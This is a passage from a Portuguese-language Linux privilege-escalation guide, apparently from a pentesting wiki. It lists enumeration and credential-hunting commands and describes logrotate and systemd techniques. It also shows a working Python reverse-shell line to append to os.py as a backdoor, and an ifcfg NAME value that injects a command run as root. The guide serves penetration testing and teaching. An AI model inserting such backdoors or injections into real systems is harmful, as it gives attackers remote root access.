for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Arquivos Web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Cópias de Segurança**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Arquivos conhecidos que contêm senhas

Leia o código de [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), ele procura por **vários arquivos possíveis que podem conter senhas**.\
**Outra ferramenta interessante** que você pode usar para isso é: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) que é uma aplicação de código aberto usada para recuperar muitas senhas armazenadas em um computador local para Windows, Linux & Mac.

### Logs

Se você puder ler logs, poderá encontrar **informações interessantes/confidenciais neles**. Quanto mais estranho for o log, mais interessante ele provavelmente será.\
Além disso, alguns logs de auditoria configurados "de forma ruim" (backdoored?) **audit logs** podem permitir que você **registre senhas** dentro dos logs de auditoria, como explicado neste post: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Para ler logs, o grupo [**adm**](interesting-groups-linux-pe/index.html#adm-group) será muito útil.

### Arquivos de shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Você também deve verificar arquivos contendo a palavra "**password**" no seu **nome** ou dentro do **conteúdo**, e também procurar por IPs e emails dentro de logs, ou por regexps de hashes.\
Não vou descrever aqui como fazer tudo isso, mas se estiver interessado pode conferir as últimas checagens que [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) executa.

## Arquivos graváveis

### Python library hijacking

Se você souber de **onde** um python script vai ser executado e você **puder escrever** nessa pasta ou puder **modificar python libraries**, você pode modificar a OS library e backdoorá-la (se você puder escrever onde o python script vai ser executado, copie e cole a os.py library).

Para **backdoor the library**, basta adicionar ao final da os.py library a seguinte linha (alterar IP e PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Exploração do logrotate

Uma vulnerabilidade em `logrotate` permite que usuários com **permissões de escrita** em um arquivo de log ou em seus diretórios pai possivelmente obtenham privilégios escalados. Isso ocorre porque `logrotate`, frequentemente executado como **root**, pode ser manipulado para executar arquivos arbitrários, especialmente em diretórios como _**/etc/bash_completion.d/**_. É importante verificar permissões não apenas em _/var/log_ mas também em qualquer diretório onde a rotação de logs seja aplicada.

> [!TIP]
> Esta vulnerabilidade afeta `logrotate` versão `3.18.0` e anteriores

Mais informações detalhadas sobre a vulnerabilidade podem ser encontradas nesta página: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Você pode explorar essa vulnerabilidade com [**logrotten**](https://github.com/whotwagner/logrotten).

Essa vulnerabilidade é muito semelhante a [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** então sempre que você descobrir que pode alterar logs, verifique quem está gerenciando esses logs e se você pode escalar privilégios substituindo os logs por symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Referência da vulnerabilidade:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Se, por qualquer motivo, um usuário for capaz de **gravar** um script `ifcf-<whatever>` em _/etc/sysconfig/network-scripts_ **ou** puder **ajustar** um já existente, então seu **system is pwned**.

Network scripts, _ifcg-eth0_ por exemplo, são usados para conexões de rede. Eles se parecem exatamente com arquivos .INI. No entanto, eles são \~sourced\~ no Linux pelo Network Manager (dispatcher.d).

No meu caso, o `NAME=` atribuído nesses network scripts não é tratado corretamente. Se você tiver **espaços em branco no `NAME` o sistema tenta executar a parte após o espaço em branco**. Isso significa que **tudo após o primeiro espaço em branco é executado como root**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Observe o espaço em branco entre Network e /bin/id_)

### **init, init.d, systemd, e rc.d**

O diretório `/etc/init.d` contém **scripts** para System V init (SysVinit), o **sistema clássico de gerenciamento de serviços do Linux**. Inclui scripts para `start`, `stop`, `restart` e, às vezes, `reload` de serviços. Estes podem ser executados diretamente ou através de links simbólicos encontrados em `/etc/rc?.d/`. Um caminho alternativo em sistemas Redhat é `/etc/rc.d/init.d`.

Por outro lado, `/etc/init` está associado ao **Upstart**, um sistema de **gerenciamento de serviços** mais recente introduzido pelo Ubuntu, que usa arquivos de configuração para tarefas de gerenciamento de serviços. Apesar da transição para o Upstart, scripts SysVinit ainda são utilizados em conjunto com as configurações do Upstart devido a uma camada de compatibilidade no Upstart.

**systemd** surge como um gerenciador de inicialização e serviços moderno, oferecendo funcionalidades avançadas como início de daemons sob demanda, gerenciamento de automounts e snapshots do estado do sistema. Ele organiza arquivos em `/usr/lib/systemd/` para pacotes de distribuição e `/etc/systemd/system/` para modificações do administrador, simplificando o processo de administração do sistema.

## Outras Técnicas

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks comumente hookam uma syscall para expor funcionalidades privilegiadas do kernel a um manager em userspace. Autenticação fraca do manager (por exemplo, checagens de assinatura baseadas na ordem de FDs ou esquemas de senha pobres) pode permitir que um app local se passe pelo manager e escale para root em dispositivos já rooteados. Saiba mais e veja detalhes de exploração aqui:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

A descoberta de serviços dirigida por regex no VMware Tools/Aria Operations pode extrair um caminho binário das linhas de comando de processos e executá-lo com -v sob um contexto privilegiado. Padrões permissivos (por exemplo, usando \S) podem corresponder a listeners staged pelo atacante em locais graváveis (por exemplo, /tmp/httpd), levando à execução como root (CWE-426 Untrusted Search Path).

Saiba mais e veja um padrão generalizado aplicável a outras stacks de discovery/monitoring aqui:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Proteções de Segurança do Kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Mais ajuda

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
